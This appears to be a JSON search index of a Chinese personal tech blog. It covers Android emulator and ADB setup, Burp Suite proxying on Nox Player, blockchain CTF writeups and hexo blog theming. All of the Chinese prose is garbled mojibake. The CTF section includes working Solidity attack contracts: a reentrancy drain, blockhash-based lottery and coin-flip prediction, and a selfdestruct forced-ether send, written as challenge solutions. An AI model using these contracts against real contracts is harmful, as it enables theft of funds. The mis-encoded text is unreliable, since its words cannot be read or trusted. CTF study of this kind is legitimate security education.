Studio Emulator + ADB ç’°å¢ƒä½ˆç½®","text":"ç´€éŒ„ä¸€ä¸‹æ€éº¼è¨­å®šå¥½ä¸€å° Android çš„è™›æ“¬æ©Ÿ æˆ‘æ˜¯ç”¨ Android Studio è£¡é¢çš„ Emulatorï¼Œæ‰€ä»¥è¦å…ˆè£ä¸€ä¸‹ Android Studio æ‰“é–‹ AVD Manager å¾Œé» Create Virtual Device é¸ä¸€å€‹ deviceï¼Œæ¯”å¦‚ Pixel 3a é¸ä¸€å€‹ system imageï¼Œæ¯”å¦‚ Pie å®Œæˆ ADB ( Android Debug Bridge ) è·¯å¾‘ åœ¨ Android SDK çš„ platform-tools è£¡é¢ï¼Œç”¨ macos çš„è©±æ‡‰è©²æœƒåœ¨ /Users/xxx/Library/Android/sdk/platform-tools/ æ²’æœ‰çš„è©±å¯ä»¥å» å®˜ç¶² è¼‰ åŸºæœ¬åŠŸèƒ½ æŒ‡ä»¤ è§£é‡‹ adb devices åˆ—å‡ºæ‰€æœ‰è£ç½® adb root ç”¨ root æ¬Šé™é‡é–‹ adb æœå‹™ adb shell äº’å‹•å¼çš„ shell adb shell &quot;ls&quot; åŸ·è¡Œä¸€è¡ŒæŒ‡ä»¤ adb push ./myfile /data/local/tmp/ å‚³æª”æ¡ˆé€²å» adb pull /data/local/tmp/myfile ./ æŠ“æª”æ¡ˆå‡ºä¾† adb reboot é‡é–‹æ©Ÿï¼Œå¯ä»¥ç°¡å–®ç²—æš´çš„é©—è­‰æœ‰æ²’æœ‰è¨­ç½®æˆåŠŸ å¦‚æœæœ‰å¤šå°è£ç½®çš„è©±ï¼Œè¦åŠ  -s æŒ‡å®šå“ªä¸€å€‹è£ç½®ï¼Œæ¯”å¦‚ adb -s emulator-5554 shell ç–‘é›£é›œç—‡ Q : é‡åˆ° adbd cannot run as root in production builds æ€éº¼è¾¦ ? A : åœ¨é¸ image çš„æ™‚å€™è¦é¸ target æ˜¯ Google APIs çš„ Q : æ€éº¼å¸è¼‰ system image ? A : æ‰“é–‹ SDK Manager ( åœ¨ AVD Manager æ—é‚Š )ï¼Œå‹¾é¸ Show Package Detailsï¼Œå°±å¯ä»¥çœ‹åˆ°ä¸‹è¼‰éçš„ system imageï¼Œå–æ¶ˆå‹¾é¸å†æŒ‰ OK å°±å¸è¼‰äº† Q : æ€éº¼å¸è¼‰ app ? A : é™¤äº†éº»ç“œçš„æ–¹æ³•å¤–ï¼Œä¹Ÿå¯ä»¥åœ¨ adb shell æ‹¿åˆ° shell ä¹‹å¾Œï¼Œç”¨ pm list packages çœ‹æœ‰å“ªäº› appï¼Œå†ç”¨ pm uninstall -k com.example.test_app å¸è¼‰ app Q : æ€éº¼æŠŠ apk æŠ“å‡ºä¾†? A : å…ˆç”¨ pm path com.example.test_app æ‰¾å‡º apk çš„è·¯å¾‘ï¼Œå†ç”¨ adb pull /data/app/com.example.test_app.apk ./ æŠ“å‡ºä¾† å…¶ä»–çš„ Android è™›æ“¬æ©Ÿ å¦‚æœä½ åªæ˜¯æƒ³ç©éŠæˆ²çš„è©±ï¼Œå¯ä»¥åƒè€ƒä¸‹é¢å¹¾æ¬¾æ¨¡æ“¬å™¨ BlueStacks NoxPlayer ( å¤œç¥æ¨¡æ“¬å™¨ ) MemuPlay ( é€é™æ¨¡æ“¬å™¨ ) ç­‰ç­‰","link":"/2020/02/15/android-emulator/"},{"title":"ã€å®‰å“é€†å‘ã€‘é€é Burp Suite Proxy å¤œç¥æ¨¡æ“¬å™¨","text":"å‰è¨€ åœ¨ä¸Šä¸€ç¯‡ adb çš„ç’°å¢ƒä½ˆç½®ä¸­ï¼Œæˆ‘å€‘æ˜¯ç”¨ Android Emulatorï¼Œä½†æˆ‘æƒ³è¦ reverse çš„ app åªæœ‰æ”¯æ´ arm ( è »å¤š app éƒ½æ²’æœ‰æ”¯æ´ x86-64 çš„ )ï¼Œè€Œåœ¨æˆ‘ x86-64 æ©Ÿå™¨ä¸Šçš„ Android Emulator ä¸Šé–‹ arm çš„è™›æ“¬æ©Ÿå¾ˆæ…¢ï¼Œæ‰€ä»¥æˆ‘å°±æ›ç”¨äº† Nox Playerï¼Œä»–åŒæ™‚æ”¯æ´ arm è·Ÿ x86-64 çš„æ¶æ§‹ï¼Œé€Ÿåº¦ä¹ŸæŒºå¿«çš„ã€‚ æ©ç­‰ç­‰ï¼Œæˆ‘å‰›å‰›æ‰ç™¼ç¾åŸä¾† Nox Player æ˜¯åœ¨ VirtualBox ä¸Šé¢é–‹ä¸€å°è™›æ“¬æ©Ÿè·‘ï¼Œå‚»çœ¼ã€‚ æ€éº¼çŸ¥é“é€™å€‹ app æ”¯æ´ä»€éº¼ç”¨ apktool è§£é–‹ apk æª”å¾Œï¼Œçœ‹ /lib è³‡æ–™å¤¾ä¸‹é¢æœ‰å“ªäº›è³‡æ–™å¤¾ï¼Œå¯èƒ½æœƒæœ‰ arm64-v8aã€armeabi-v7aã€x86ã€x86_64 ç­‰ï¼Œé€™äº›å°±æ˜¯é€™å€‹ app ç”¨åˆ°çš„å‡½å¼åº«ï¼Œæ²’æœ‰å°æ‡‰æ¶æ§‹çš„å‡½å¼åº«ç•¶ç„¶å°±æ˜¯ä¸æ”¯æ´äº†ï¼Œæˆ–è€…æœ‰äº› app æœƒå°‡æ¯å€‹æ¶æ§‹åˆ†é–‹ç™¼ä½ˆï¼Œåªè¦å»ä¸‹è¼‰å°æ‡‰æ¶æ§‹çš„ app å°±å¯ä»¥äº†ã€‚ adb æ€éº¼é€£ä¸Šå¤œç¥æ¨¡æ“¬å™¨å¤œç¥æ¨¡æ“¬å™¨é è¨­æœƒæŠŠ adb server é–‹åœ¨ port 62001, 62025, 62026, â€¦ ( æˆ‘ä¸çŸ¥é“ç‚ºä»€éº½ 62001 ç›´æ¥è·³åˆ° 62025 ) æ‰€ä»¥ adb connect localhost:62001 å°±å¯ä»¥å•¦ Drony ä¸»è¦æ˜¯åƒè€ƒé€™ç¯‡ Android Hacking | Setup Global Proxy for All Apps in Android (without root) with Burp Suite çš„æ•™å­¸ï¼Œåœ¨ä½¿ç”¨ Drony å‰ï¼Œæˆ‘é‚„æœ‰ç”¨éå¦ä¸€æ¬¾å« ProxyDroidï¼Œä¸éæ²’æˆåŠŸï¼Œä¸çŸ¥é“å‡ºäº†ä»€éº¼äº‹ã€‚ åŸºæœ¬æµç¨‹æ˜¯é€™æ¨£çš„ï¼Œå› ç‚º Drony æœ¬èº«ä¹Ÿæ˜¯ä¸€å€‹ proxy serverï¼Œæ‰€ä»¥è¦å…ˆåœ¨ Android çš„è¨­å®šä¸­å°‡ proxy å°å‘åˆ° Dronyï¼Œç„¶å¾Œåœ¨ Drony çš„è¨­å®šä¸­å°‡ proxy å°å‘ä¸»æ©Ÿçš„ Burp Suiteã€‚ ç¬¬ä¸€æ­¥ æ‰“é–‹ Android çš„è¨­å®šï¼Œç…§è‘—ä¸‹é¢é€™æ¨£é» è¨­å®š &gt; ç„¡é™èˆ‡ç¶²è·¯ &gt; Wi-Fi &gt; ä½ çš„ Wi-FI çš„åå­— ( é•·æŒ‰ä»– ) &gt; ä¿®æ”¹ç¶²è·¯ &gt; é¡¯ç¤ºé€²éšé¸é … &gt; Proxy ( æ‰‹å‹• ) ä¸»æ©Ÿåç¨±å¡« 127.0.0.1ï¼Œé€šè¨ŠåŸ å¡« 8020 ( Drony é è¨­çš„é€šè¨ŠåŸ  ) ç¬¬äºŒæ­¥ æ‰“é–‹ Drony çš„è¨­ç½®ï¼Œç…§è‘—ä¸‹é¢é€™æ¨£é» è¨­ç½® &gt; ç¶²è·¯ &gt; ç„¡ç·šç¶²è·¯ &gt; ä½ çš„ Wi-FI çš„åå­— ä»£ç†é¡å‹é¸æ‰‹å†Š ( ä¹Ÿå°±æ˜¯ Manualï¼ŒçœŸçˆ›çš„ç¿»è­¯ )ï¼Œä¸»æ©Ÿåç¨±å¡«ä¸»æ©Ÿçš„ ipï¼Œé€šè¨ŠåŸ å¡« 8080 ( Burp Suite é è¨­çš„é€šè¨ŠåŸ  ) æ€éº¼æ‰¾ä¸»æ©Ÿçš„ ipä¸»æ©ŸåŸºæœ¬ä¸Šæœƒæ˜¯ Nox Player çš„ default gateway ( å…¶å¯¦å°±æ˜¯åœ¨ VirtualBox çš„ NAT Mode )ï¼Œæ‰€ä»¥ä¸‹ adb shell ip route show æ‰¾åˆ° default gateway å°±æ˜¯ä¸»æ©Ÿçš„ ip äº† å®Œæˆ é€™æ¨£å°±è¨­å®šå¥½å•¦ï¼Œåœ¨æ—¥èªŒé é¢æŠŠé–‹é—œæ‰“é–‹å°±å¯ä»¥äº†ã€‚ Burp Suite æ†‘è­‰å®‰è£ é †ä¾¿å®‰è£ä¸€ä¸‹ Burp Suite çš„æ†‘è­‰ï¼Œé€™æ¨£å°±ä¸æœƒä¸€ç›´è·³æ†‘è­‰å•é¡Œäº† å…ˆåˆ° http://burp ä¸‹è¼‰ Burp Suite çš„æ†‘è­‰ï¼Œè¼‰ä¸‹ä¾†æ˜¯ der å‰¯æª”åçš„è©±ï¼Œå…ˆæŠŠä»–æ”¹åæˆ cer å‰¯æª”åçµå°¾ æ‰“é–‹ Android çš„è¨­å®šï¼Œç…§è‘—ä¸‹é¢é€™æ¨£é» è¨­å®š &gt; å€‹äºº &gt; å®‰å…¨æ€§ &gt; æ†‘è­‰å„²å­˜ç©ºé–“ &gt; å¾ SD å¡å®‰è£ ( é¸ cacert.cer ) å®‰è£çš„æ™‚å€™ä»–æœƒå«ä½ è¨­å®šä¸€ä¸‹ PIN ç¢¼","link":"/2020/03/18/android-proxy/"},{"title":"ã€CTF Writeupsã€‘Security Innovation Blockchain CTF","text":"é€™é‚Šæ˜¯ç´€éŒ„æˆ‘å¯« Security Innovation Blockchain CTF çš„ Writeups Donation é€™é¡Œæ˜¯ç°½åˆ°é¡Œ å°±åªæ˜¯è®“æˆ‘å€‘å‘¼å«åˆç´„è£¡é¢çš„é€™å€‹å‡½å¼ withdrawDonationsFromTheSuckersWhoFellForIt Lock Box é€™é¡Œæœ‰å€‹ private çš„ pin è®Šæ•¸ï¼Œä½†æ˜¯ private åªæ˜¯ä»£è¡¨é‚£å€‹è®Šæ•¸æ²’æœ‰ getter å‡½å¼ï¼ŒæŠŠåˆç´„çš„ç‹€æ…‹æŠ“ä¸‹ä¾†å°±çœ‹å…‰å…‰å•¦ ä½¿ç”¨ web3.eth.getStorageAt é€™å€‹å‡½å¼ çˆ¶åˆç´„çš„è®Šæ•¸æœƒåœ¨å­åˆç´„çš„è®Šæ•¸çš„å‰é¢ æ‰€ä»¥ position 0 çš„ä½å€æ˜¯ authorizedToPlayï¼Œè€Œ position 1 çš„ä½å€å°±æ˜¯ pin è®Šæ•¸åœ¨ storage è£¡é¢æ€éº¼æ“ºçš„å¯ä»¥åƒè€ƒé€™ç¯‡ Understanding Ethereum Smart Contract Storage Piggy Bank é€™é¡Œç›´æ¥å‘¼å« collectFunds å°±å¥½äº† åªæœ‰ PiggyBank çš„ collectFunds æœ‰ onlyOwnerï¼ŒCharliesPiggyBank çš„ collectFunds æ²’æœ‰ onlyOwner SI Token Sale é€™é¡Œçš„ purchaseTokens æ²’æœ‰ç”¨ SafeMathï¼Œä¹Ÿæ²’æœ‰æª¢æŸ¥ _value è¦å¤§æ–¼ feeAmount å…ˆè½‰å€‹ 0.000001 çµ¦åˆç´„ï¼Œé€™æ¨£ 0.000001 - 0.00001 å°±æœƒ underflow è®Šæˆå¾ˆå¤§çš„æ•¸å­—ï¼Œå°±å¾—åˆ°äº†è¶…å¤šçš„ token ç„¶å¾Œå†ç”¨ refundTokens å°±å¯ä»¥åŠåƒ¹æŠŠ token æ›æˆ ether éŒ¢éŒ¢äº† Secure Bank SecureBank çš„ withdraw å’Œ MembersBank çš„ withdraw å…¶ä¸­çš„ _value åƒæ•¸å½¢æ…‹ä¸ä¸€æ¨£ ä»–å€‘æœƒè¢«çœ‹æˆæ˜¯ä¸ä¸€æ¨£çš„å‡½å¼ï¼Œæ‰€ä»¥æœƒæœ‰å…©å€‹ä¸ä¸€æ¨£çš„å‹æ…‹ withdraw å¯ä»¥å‘¼å« è€Œ MembersBank çš„ withdraw æ²’æœ‰æª¢æŸ¥æ˜¯ä¸æ˜¯æœ¬äººï¼Œæ‰€ä»¥å°±ç›´æ¥æŠŠ contract creator çš„éŒ¢é ˜èµ° Lottery é€™é¡Œè¦çŒœ entropy^entropy2 çš„å€¼ï¼ŒçŒœåˆ°å°±å¯ä»¥æ‹¿èµ°è£¡é¢çš„éŒ¢éŒ¢ entropy = blockhash(block.number)ï¼Œä½†æ˜¯æˆ‘å€‘æ²’è¾¦æ³•çŸ¥é“é€™å€‹ block çš„ blockhashï¼Œå› ç‚ºé€™å€‹ block é‚„æ²’ç®—å®Œ ä½†é€™æ¨£å¯«ä¸æœƒæœ‰éŒ¯èª¤ï¼Œåªæ˜¯å‡ºä¾†çš„å€¼æœƒæ˜¯ 0 æ—¢ç„¶ entropy = 0 é‚£å°±åªå‰© entropy2ï¼Œè€Œ entropy2 æ˜¯æ ¹æ“š msg.sender ä¾†çš„ æ‰€ä»¥æˆ‘å€‘å¯ä»¥ç›´æ¥ç®—å‡º _seed çš„å€¼ å¯ä»¥ç›´æ¥ç”¨ remix å¯«å€‹ç°¡å–®çš„ smart contract å¹«æˆ‘å€‘ç®—é‚£å€‹å€¼ï¼Œç„¶å¾Œåˆ©ç”¨ event ä¾†å°å‡ºé‚£å€‹å€¼ ( ç•¶ print ç”¨ ) 123456789pragma solidity ^0.5.9;contract test { event Log(bytes32 value); function go () public { emit Log(keccak256(abi.encodePacked(msg.sender))); }} æˆ–æ˜¯ç›´æ¥å¯«ä¸€å€‹æ”»æ“Šåˆç´„ï¼Œå»å‘¼å« play å‡½å¼ è¨˜å¾—è¦å…ˆæŠŠé€™å€‹åˆç´„åŠ åˆ° authorizedToPlayï¼Œå¦‚æœæ˜¯ gas ä¸å¤ å°±èª¿é«˜ gas limit å§ 12345678910111213141516pragma solidity ^0.5.9;import &quot;./challenge.sol&quot;;contract hack { function exploit(address payable _target) public payable { Lottery target = Lottery(_target); bytes32 entropy2 = keccak256(abi.encodePacked(this)); uint256 seeds = uint256(entropy2); target.play.value(msg.value)(seeds); msg.sender.transfer(address(this).balance); }} Trust Fund é€™é¡Œæ˜¯ç¶“å…¸çš„ reentrant attack 123456789101112131415161718192021222324252627pragma solidity ^0.5.9;contract TrustFund { function withdraw() external {}}contract hack { address target = 0xd297ab1c9653295BdE4f6b2e32574Ac5DD994997; uint count = 10; function () external payable { if (count &gt; 0) { count--; TrustFund trust = TrustFund(target); trust.withdraw(); } } function exploit () public { TrustFund trust = TrustFund(target); trust.withdraw(); } function withdraw () public { msg.sender.transfer(address(this).balance); }} Heads or Tails é€™é¡Œè·Ÿ Lottery å¾ˆåƒï¼Œä¸éç”¨çš„æ˜¯ä¸Šä¸€å€‹ block çš„ blockhash é‚£å°±å¯«å€‹æ”»æ“Šåˆç´„å»å‘¼å« playï¼Œå°±å¯ä»¥ç®—å‡ºä¸€æ¨£çš„ entropy çµ¦ 0.1 ether èƒ½è³º 0.05 etherï¼Œæ‰€ä»¥ç©å€‹ 20 æ¬¡å°±æŠŠéŒ¢å…¨éƒ¨æ’ˆå‡ºä¾†å•¦ è¨˜å¾—è¦å¯« fallback å‡½å¼æ‰èƒ½æ¥éŒ¢é€²ä¾†å‘€ ( æˆ‘é€™è£¡å¡è¶…ä¹…der ) 123456789101112131415161718192021222324pragma solidity ^0.5.9;contract HeadsOrTails { function play(bool _heads) external payable {}}contract hack { address target = 0xf8583ccB9900615e0b8304A16539EBFD96c2B0af; function () external payable {} function exploit () public payable { bytes32 entropy = blockhash(block.number - 1); bool coinFlip = (entropy[0] &amp; '\\x01') == '\\x01'; HeadsOrTails heads = HeadsOrTails(target); for (uint i = 0; i &lt; 20; i++) { heads.play.value(0.1 ether)(coinFlip); } msg.sender.transfer(address(this).balance); }} Record Label é€™é¡Œçš„é¡Œç›®å¾ˆé•·ï¼Œä¸»è¦çš„é‚è¼¯å°±æ˜¯ä½ é ˜éŒ¢çš„æ™‚å€™æœƒè¢« royalties æŠ½æˆï¼Œmanager æœƒæŠ½æˆ 80 è¶´çš„éŒ¢éŒ¢ æ‰€ä»¥å¦‚æœç›´æ¥å‘¼å« withdrawFundsAndPayRoyalties å°±å¯ä»¥æ‹¿åˆ° 0.2 etherï¼Œroyalties æŠ½èµ° 0.8 etherï¼Œé€™é¡Œå°±è§£æ‰äº† ( é¡Œç›®åˆç´„ balance = 0 ) ä¸éæ­£ç¢ºçš„è§£æ³• ( æˆ‘å…¨éƒ½è¦ ) æ‡‰è©²æ˜¯æ‰¾å‡º _manager çš„åœ°å€ï¼Œç„¶å¾Œå‘¼å« addRoyaltyReceiver æŠŠ receiverToPercentOfProfit é€™å€‹ mapping ä¸­ _manager çš„ percent è¦†å¯«æˆ 0 é€™æ¨£å»é ˜éŒ¢å°±ä¸æœƒè¢«æŠ½æˆäº† Slot Machine é€™é¡Œçš„é¡Œç›®å¾ˆçŸ­ï¼Œå°±ä¸€å€‹ fallback å‡½å¼ ä½†æ˜¯ç¬¬ä¸€è¡Œé™åˆ¶ä¸€æ¬¡åªèƒ½åŒ¯æ¬¾ 1 szabo ( 0.000001 ether ) ç›®æ¨™æ˜¯è¦è®“é€™å€‹åˆç´„çš„ balance å¤§æ–¼ç­‰æ–¼ 5 etherï¼Œä»–å°±æœƒæŠŠæ‰€æœ‰éŒ¢éŒ¢éƒ½çµ¦ä½  å…¶ä¸­ä¸€å€‹ä¸é€é fallback çµ¦éŒ¢çš„æ–¹æ³•å°±æ˜¯ç”¨ selfdestruct selfdestruct å°±æ˜¯æŠŠåˆç´„æ¸…é™¤æ‰ï¼Œåœ¨è¢«æ¸…é™¤æ‰ä¹‹å‰ï¼Œé€™å€‹åˆç´„å¯ä»¥æŠŠä»–çš„éŒ¢éŒ¢åŒ¯æ¬¾çµ¦ä¸€å€‹å¸³æˆ¶ï¼Œè€Œé€™å€‹åŒ¯æ¬¾çš„å‹•ä½œä¸æœƒç¶“é fallback å‡½å¼ å¯«ä¸€å€‹æ”»æ“Šåˆç´„ï¼Œä¸¦çµ¦ä»– 5 etherï¼Œè®“ä»–è‡ªæˆ‘æ¯€æ»…ï¼Œä¸¦åœ¨æ¯€æ»…ä¹‹å‰æŠŠ 5 ether åŒ¯æ¬¾çµ¦é¡Œç›®åˆç´„ 1234567pragma solidity ^0.5.9;contract hack { function exploit () public payable { selfdestruct(address(0x22f616f6b95e23efa8FBBAE44BeeC05890E12A4E)); }} https://f3real.github.io/tag/ethereum.html https://xz.aliyun.com/t/2759","link":"/2019/06/07/blockchain-ctf/"},{"title":"ã€éƒ¨è½æ ¼é–‹ç™¼æ—¥èªŒã€‘0x00","text":"ä¹‹å‰çš„éƒ¨è½æ ¼æ˜¯ç”¨ mkdocsï¼Œä½†æ˜¯ mkdocs å…¶å¯¦æ˜¯ç”¨ä¾†ç”Ÿæˆ document çš„ï¼Œä¸æ˜¯æ‹¿ä¾†ç”Ÿæˆéƒ¨è½æ ¼çš„ï¼Œæ‰€ä»¥æ–‡ç« éƒ½æ²’æœ‰æ—¥æœŸï¼Œä¹Ÿæ²’æœ‰è¿‘æœŸæ–‡ç« æˆ–æ˜¯æ¨™ç±¤çš„åŠŸèƒ½ï¼Œæˆ‘ä¹‹æ‰€ä»¥é¸ mkdocs æ˜¯å› ç‚º mkdocs-material å¯¦åœ¨å¤ªå¥½çœ‹äº†å¾ˆå°æˆ‘èƒƒå£ï¼Œä¸éæœ€è¿‘èˆˆèµ·äº†æƒ³å¹«éƒ¨è½æ ¼æ›å€‹çš®çš„å¿µé ­ï¼Œä¸»è¦æ˜¯çœ‹ä¸Šäº† icarus å’Œ material-x é€™å…©å€‹ä¸»é¡Œï¼Œéƒ½æ˜¯ hexo çš„ä¸»é¡Œï¼Œæœ€å¾Œé¸äº† icarusï¼Œç„¶å¾Œå†è‡ªå·±æ‰‹å‹•èª¿æ•´ï¼Œä¸‹é¢æœƒèªªæ˜ä¸€ä¸‹æˆ‘æ‰‹å‹•èª¿æ•´çš„å…§å®¹ æ’ç‰ˆ é€™å€‹ä¸»é¡Œæ•´é«”ä¾†èªªå¾ˆå¥½çœ‹çš„ï¼Œä½†æ˜¯æˆ‘ä¸å–œæ­¡ä»–çš„æ’ç‰ˆï¼Œæ–‡ç« åªèƒ½æ“ åœ¨ä¸­é–“ç´°ç´°é•·é•·çš„ï¼Œå·¦å³å…©é‚Šé‚„ç•™äº†å¾ˆå¤šç©ºéš™ï¼Œä¸çŸ¥é“æ˜¯ä½œè€…çš„è¢å¹•å¤ªå°é‚„æ˜¯æˆ‘è¢å¹•å¤ªå¤§ï¼Œæ‰€ä»¥æˆ‘æŠŠæ‰€æœ‰ widget éƒ½ç§»åˆ°å·¦é‚Šï¼Œç„¶å¾ŒæŠŠæ¬„ä½çš„æ¯”ä¾‹æ”¹æˆ 3:9ï¼Œcss çš„éƒ¨ä»½åœ¨ source/css/style.styl:21 æŠŠå¯¬åº¦èª¿å¯¬ layout/layout.ejs12case 2: return 'is-9-tablet is-9-desktop is-9-widescreen'; layout/common/widget.ejs12case 2: return 'is-3-tablet is-3-desktop is-3-widescreen'; source/css/style.styl1234567891011121314gap = 40px...@media screen and (min-width: screen-widescreen) .is-1-column .container .is-2-column .container max-width: screen-widescreen - 2 * gap width: screen-widescreen - 2 * gap@media screen and (min-width: screen-fullhd) .is-2-column .container max-width: screen-fullhd - 2 * gap width: screen-fullhd - 2 * gap .is-1-column .container max-width: screen-fullhd - 2 * gap width: screen-fullhd - 2 * gap Read More åŸæœ¬ icarus åªæœ‰ excerpt é€™å€‹é¸é …å¯ä»¥åŠ åœ¨æ–‡ç« çš„ front-matter ä¸­ï¼Œå¦‚ä¸‹ 1234---title: &quot;éƒ¨è½æ ¼é–‹ç™¼æ—¥èªŒ&quot;excerpt: å¯«ä¸€äº›æ‘˜è¦åœ¨é€™é‚Š--- ä½†æ˜¯è¦æ¯ä¸€ç¯‡éƒ½è¦è‡ªå·±å¯«æ‘˜è¦å¥½éº»ç…©ï¼Œæˆ‘æ¯”è¼ƒæƒ³è¦çš„æ˜¯åªé¡¯ç¤ºå›ºå®šé•·åº¦ï¼Œç„¶å¾Œé‚Šé‚Šæ¨¡ç³Šè™•ç†ï¼Œæ‰€ä»¥å°±è‡ªå·±æ‰‹åˆ»äº†ä¸€å€‹ layout/common/article.ejs12345678&lt;div class=&quot;card &lt;%= index &amp;&amp; (!post.hasOwnProperty('readmore') || post.readmore) ? 'card-readmore' : '' %&gt;&quot;&gt;... &lt;% if (index &amp;&amp; (!post.hasOwnProperty('readmore') || post.readmore)) { %&gt; &lt;div class=&quot;level is-mobile readmore-button&quot;&gt; ... &lt;/div&gt; &lt;% } %&gt;... source/css/style.styl12345678910111213141516171819202122232425262728.card-readmore max-height: 400px overflow: hidden position: relative .readmore-button position absolute left: 0 bottom: 20px width: 100% display: flex justify-content center z-index: 20 &amp;:after content: '' position: absolute bottom: 60px width: 100% height: 100px z-index: 10 background-image: linear-gradient(to bottom, hsla(0, 100%, 100%, 0), hsla(0, 100%, 100%, 0.9)) &amp;:before content: '' position: absolute bottom: 0 width: 100% height: 60px z-index: 10 background-image: linear-gradient(to bottom, hsla(0, 100%, 100%, 0.9), hsla(0, 100%, 100%, 1)) Adblock æˆ‘æœ¬èº«æœ‰åœ¨ç”¨ AdBlockï¼Œç„¶å¾Œåœ¨ç”¨ icarus ä¸»é¡Œçš„æ™‚å€™ç™¼ç¾æœ‰äº›ç‰©ä»¶æœƒæ†‘ç©ºæ¶ˆå¤±ï¼Œæ¯”å¦‚ back-to-top é‚£å€‹æŒ‰äº†å¯ä»¥å›åˆ°é é¢é ‚ç«¯çš„å°æŒ‰éˆ•ï¼Œå¾Œä¾†ç™¼ç¾æ˜¯è¢« AdBlock ç äº†ï¼Œå› ç‚ºé‚£å€‹å°æŒ‰éˆ•æœ‰ .back-to-top é€™å€‹ classï¼Œä¸åª .back-to-top é‚„æœ‰å¾ˆå¤šé—œéµå­—æœƒè¢«ç ï¼Œå¯ä»¥çœ‹é€™ä»½ Class and ID to avoid because of AdBlockï¼Œé‚£æˆ‘çš„è§£æ±ºè¾¦æ³•å°±æ˜¯æŠŠåŸå§‹ç¢¼è£¡æ‰€æœ‰çš„ back-to-top æ”¹åæˆ bottom-to-top å°±åœ¨å‰›å‰›ï¼Œæˆ‘å¯«å®Œç¬¬ä¸€æ®µä¹‹å¾Œï¼Œç™¼ç¾ä¸Šé¢çš„ h2 æ¨™é¡Œ Adblock å› ç‚º markdown ç”Ÿæˆ html æ™‚è‡ªå‹•åŠ äº† id=Adblockï¼Œç„¶å¾Œå°±è¢« AdBlock ç äº†ï¼Œåªå¥½æ”¹æˆè‡ªå·±æ‰‹åˆ» html 1&lt;h2&gt;Adblock&lt;/h2&gt; å¦ä¸€å€‹è¢«ç æ‰çš„æ˜¯ font-awesome çš„ icon .fa-instagramï¼Œé€™å€‹å°±ä¸å¥½æ”¹åäº†ï¼Œæ‰€ä»¥æˆ‘åŠ äº†ä¸€å°è¡Œ javascript æŠŠ .fa-ig æ”¹æˆ .fa-instagramï¼Œä»¥çµæœä¾†çœ‹æˆ‘çš„ script è·‘çš„é †åºæ‡‰è©²æ˜¯æ¯” AdBlock ä¾†å¾—å¾Œé¢æ‰€ä»¥æ²’æœ‰è¢«ç  source/js/main.js1234$(document).ready(function() { $('.fa-ig').addClass('fa-instagram'); $('.fa-ig').removeClass('fa-ig');}); Github mkdocs-material ä¸»é¡Œçš„å³ä¸Šè§’æœ‰é¡¯ç¤º github star çš„åŠŸèƒ½ï¼Œæˆ‘è¦ºå¾—å¾ˆé…·ï¼Œæ‰€ä»¥å°±æ¬éä¾†äº† layout/common/navbar.ejs123456&lt;a class=&quot;navbar-item github-source&quot; href=&quot;&lt;%= github.url %&gt;&quot;&gt; &lt;div class=&quot;github-source-icon&quot;&gt;&lt;i class=&quot;fab fa-lg fa-github-alt&quot;&gt;&lt;/i&gt;&lt;/div&gt; &lt;div class=&quot;github-source-repository&quot;&gt; &lt;%= github.name %&gt; &lt;/div&gt;&lt;/a&gt; source/css/style.styl1234567891011121314151617181920212223242526.github-source .github-source-icon padding: 5px .github-source-repository padding-left: 10px font-size: 10px font-weight: 1000 ul animation: animateElement linear .3s; animation-iteration-count: 1; li float: left font-weight: 200 #github-forks margin-left: 3px@keyframes animateElement{ 0% { opacity:0; transform: translate(0px,10px); } 100% { opacity:1; transform: translate(0px,0px); }} source/js/main.js1234567891011121314151617181920212223242526272829303132333435363738394041424344454647if (typeof (IcarusThemeSettings) !== 'undefined' &amp;&amp; typeof (IcarusThemeSettings.github.url) !== 'undefined') { const url = IcarusThemeSettings.github.url console.log(url) const matches = /^.+github\\.com\\/([^/]+)\\/?([^/]+)?.*$/.exec(url) console.log(matches) if (matches &amp;&amp; matches.length === 3) { const [, user, name] = matches console.log(user, name) const api = `https://api.github.com/users/${user}/repos` const paginate = (page = 0) =&gt; ( fetch(`${api}?per_page=100&amp;sort=updated&amp;page=${page}`) .then(response =&gt; response.json()) .then(data =&gt; { if (!(data instanceof Array)) return [] /* Display number of stars and forks, if repository is given */ if (name) { const repo = data.find(item =&gt; item.name === name) if (!repo &amp;&amp; data.length === 30) return paginate(page + 1) if (typeof repo.stargazers_count !== 'number' || typeof repo.forks_count !== 'number') return [] /* If we found a repo, extract the facts */ return repo ? [ `${repo.stargazers_count} Stars`, `${repo.forks_count} Forks` ] : [] /* Display number of repositories, otherwise */ } else { return [ `${data.length} Repositories` ] } }) ) paginate().then(data =&gt; { console.log(data) const [stars, forks] = data const facts = $(`&lt;ul class=&quot;github-facts&quot;&gt;&lt;li id=&quot;github-stars&quot;&gt;${stars}&lt;/li&gt;&lt;li id=&quot;github-forks&quot;&gt;â€¢ ${forks}&lt;/li&gt;&lt;/ul&gt;`) $('.github-source-repository').append(facts) }) }} èˆŠéƒ¨è½æ ¼ èˆŠçš„éƒ¨è½æ ¼æˆ‘é‚„åœ¨æ…¢æ…¢æ¬ç§»ç•¶ä¸­ï¼Œæ‰€ä»¥æˆ‘æŠŠ mkdocs ç”Ÿæˆçš„ html æ”¾é€²ä¾† hexo ç•¶ static filesï¼Œåªè¦æ”¾åœ¨ source/old/ åº•ä¸‹ç„¶å¾Œåœ¨ _config.yml è£¡é¢åŠ ä¸€è¡Œ skip_render: old/**ï¼Œhexo å°±ä¸æœƒå» render ä»–äº† ç–‘é›£é›œç—‡ åœ¨æ”¹ä¸»é¡ŒåŸå§‹ç¢¼çš„éç¨‹ä¸­ï¼Œé‡åˆ°å„ç¨®å¥‡æ€ªå•é¡Œæ™‚ï¼Œè¨˜å¾—å…ˆ hexo clean ä¸€ä¸‹","link":"/2020/01/23/blog00/"},{"title":"ã€éƒ¨è½æ ¼é–‹ç™¼æ—¥èªŒã€‘0x01","text":"éƒ¨è½æ ¼æ¶å¥½å¾Œï¼Œè¶ç†±ä½¿ç”¨ä¸€ä¸‹å„ç¨®ç¶²ç«™è¿½è¹¤è©•æ¸¬çš„å·¥å…·ï¼Œæ¯”å¦‚ Google Search Console, Google Analytics, PageSpeed Insights, Sitechecker, Hotjar Hotjar è¨˜éŒ„ä½¿ç”¨è€…é»æ“Šçš„ heatmap è¨˜éŒ„ä½¿ç”¨è€…æ¸¸æ¨™ç§»å‹•çš„è·¯å¾‘ é‚„å¯ä»¥æ”¶é›†ä½¿ç”¨è€…çš„ feedback å›é¥‹ï¼Œä¸éè¼‰å…¥æ™‚é–“æœ‰é»ä¹…ï¼Œéƒ¨è½æ 